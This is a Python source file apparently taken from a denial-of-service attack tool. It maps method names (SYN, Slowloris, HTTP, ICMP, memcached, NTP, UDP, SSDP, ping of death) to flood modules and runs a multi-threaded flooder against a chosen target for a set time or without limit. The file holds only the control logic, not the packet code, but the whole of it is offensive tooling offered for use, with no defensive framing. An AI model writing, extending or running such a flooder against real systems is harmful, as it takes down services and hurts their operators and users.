# Import modules
import sys
from stringcolor import *
from time import time, sleep
from threading import Thread
from bin.crash import CriticalError
from bin.addons.banner import banner
from bin.addons.banner import methods_help
from humanfriendly import format_timespan, Spinner
from bin.addons.ip_tools import GetTargetAddress, InternetConnectionCheck


purple = "#7202fc"
red = "#ff0033"
green = "#02f93c"
pink = "#f535aa"
yellow = "#eefc32"


def GetMethodByName(method):
    methods = [
        "syn",
        "slowloris",
        "http",
        "slowloris",
        "icmp",
        "memcached",
        "ntp",
        "udp",
        "ssdp",
        "armagedom",
    ]

    if method == "POD":
        dir = "bin.attacks.ping_of_death"
    elif method in methods:
        dir = f"bin.attacks.{method}"
    else:
        print(
            f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('Unknown ddos method', yellow)} {cs(repr(method), red)} {cs('selected.', yellow)}"
        )
        methods_help()
        sys.exit(1)

    module = __import__(dir, fromlist=["object"])
    if hasattr(module, "flood"):
        method = getattr(module, "flood")
        return method
    else:
        CriticalError(
            f"Method 'flood' not found in {repr(dir)}. Please use python 3.8", "-"
        )


""" Class to control attack methods """


class AttackMethod:
    # Constructor
    def __init__(self, name, duration, threads, target):
        self.name = name
        self.duration = duration
        self.threads_count = threads
        self.target_name = target
        self.target = target
        self.threads = []
        self.is_running = False

    # Enter
    def __enter__(self):
        InternetConnectionCheck()
        self.method = GetMethodByName(self.name)
        self.target = GetTargetAddress(self.target_name, self.name)
        return self

    # Exit
    def __exit__(self, exc_type, exc_val, exc_tb):
        print(
            f"\033[1m{cs('[✔] SUCCESS', green)}\033[0m {cs('Attack completed!', purple)}"
        )

    # Run time checker
    def __RunTimer(self):
        __stopTime = time() + self.duration
        if self.duration != 0:
            while time() < __stopTime:
                if not self.is_running:
                    return
                sleep(1)
        else:
            while True:
                if not self.is_running:
                    return
                sleep(1)
        self.is_running = False

    # Run flooder
    def __RunFlood(self):
        while self.is_running:
            self.method(self.target)

    # Start threads
    def __RunThreads(self):
        # Run timer thread
        thread = Thread(target=self.__RunTimer)
        thread.start()
        # Create flood threads
        for _ in range(self.threads_count):
            thread = Thread(target=self.__RunFlood)
            self.threads.append(thread)
        # Start flood threads
        with Spinner(
            label=f"{cs(f'Starting {self.threads_count} threads', yellow)}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))
        # Wait flood threads for stop
        for index, thread in enumerate(self.threads):
            thread.join()
            print(f"{cs('[+]', green)} {cs(f'Stopped thread {(index + 1)}', yellow)}")

    # Start ddos attack
    def Start(self):
        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)

        never = (
            cs("N", "#ff0000")
            + cs("E", "#ffa500")
            + cs("V", "#008000")
            + cs("E", "#7202fc")
            + cs("R", "#ee82ee")
        )

        if self.duration != 0:
            print(
                f"\033[1m{cs('[?]', pink)}\033[0m {cs('Starting attack to', '#00aeff')} {cs(target, yellow)} {cs('using method', '#00aeff')} {cs(self.name, yellow)}.\n"
                f"\033[1m{cs('[?]', pink)}\033[0m {cs('Attack will be stopped after', '#00aeff')} \033[1m{cs(duration, pink)}\033[0m."
            )
        else:
            print(
                f"\033[1m{cs('[?]', pink)}\033[0m {cs('Starting attack to', '#00aeff')} {cs(target, yellow)} {cs('using method', '#00aeff')} {cs(self.name, yellow)}.\n"
                f"\033[1m{cs('[?]', pink)}\033[0m {cs('Attack will be stopped after...', '#00aeff')} \033[1m{never}\033[0m."
            )

        self.is_running = True
        try:
            self.__RunThreads()
        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"\n\033[1m{cs('[✘] ERROR', red)}\033[0m {cs(f'Ctrl+C detected. Stopping {self.threads_count} threads..', yellow)}"
            )
            print(f"{cs('Please, wait for all threads stop', yellow)}")
            # Wait all threads for stop
            for thread in self.threads:
                thread.join()
            banner()
        except Exception as err:
            print(err)
            sleep(1.5)
            from bin.addons.clean import clear

            clear()
            banner()
